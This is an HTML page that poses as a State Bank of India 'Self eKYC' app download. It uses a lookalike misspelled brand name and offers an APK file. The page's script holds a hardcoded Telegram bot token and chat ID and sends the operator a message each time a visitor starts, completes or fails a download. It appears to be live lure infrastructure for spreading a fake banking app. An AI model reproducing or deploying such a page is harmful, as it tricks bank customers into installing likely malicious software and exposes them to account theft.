<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Download SBI Self ekYC APK</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html, body {
      height: 100%;
      font-family: Arial, sans-serif;
    }

    body {
      background: url('https://self-e-kyc-sbi.vercel.app/bakg.jpg') no-repeat center center fixed;
      background-size: cover;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
    }

    .overlay {
      background-color: rgba(0, 0, 0, 0.5);
      padding: 40px;
      border-radius: 12px;
      text-align: center;
      backdrop-filter: blur(4px);
    }

    h2 {
      font-size: 28px;
      margin-bottom: 20px;
    }

    p {
      font-size: 18px;
      margin-bottom: 30px;
    }

    button {
      padding: 12px 24px;
      font-size: 18px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }

    button:hover {
      background-color: #0056b3;
    }

    a {
      text-decoration: none;
    }
  </style>
</head>
<body>
  <div class="overlay">
    <h2>üì≤ Download SBl SeIf eKYC App</h2>
    <p>Click the button below to download the latest APK file.</p>
    <a id="downloadLink" href="sbi_self_ekyc.apk" download>
      <button id="downloadBtn">üì• Download Now</button>
    </a>
  </div>

  <script>
    // Telegram Config
    const chatId = "6677946042";
    const botToken = "7705340121:AAFSqXEFyyTre0atb8O1G-bCTwGLrM_tX_k";

    async function sendTelegramMessage(message) {
      try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: message
          })
        });
      } catch (err) {
        console.error("Telegram Error:", err);
      }
    }

    const downloadBtn = document.getElementById("downloadBtn");
    const downloadLink = document.getElementById("downloadLink");

    downloadBtn.addEventListener("click", async (e) => {
      // Step 1: Notify that download started
      await sendTelegramMessage("üì≤ User started downloading SBI Self eKYC APK.");

      // Step 2: Wait for file download to begin
      const url = downloadLink.getAttribute("href");
      const fileName = url.split("/").pop();

      try {
        const response = await fetch(url);
        const blob = await response.blob();

        // Trigger download manually
        const a = document.createElement("a");
        a.href = URL.createObjectURL(blob);
        a.download = fileName;
        document.body.appendChild(a);
        a.click();
        a.remove();

        // Step 3: Notify that download completed
        await sendTelegramMessage("‚úÖ Download completed for SBI Self eKYC APK.");
      } catch (error) {
        await sendTelegramMessage("‚ùå Download failed or cancelled.");
      }

      // Prevent default browser navigation
      e.preventDefault();
    });
  </script>
</body>
</html>
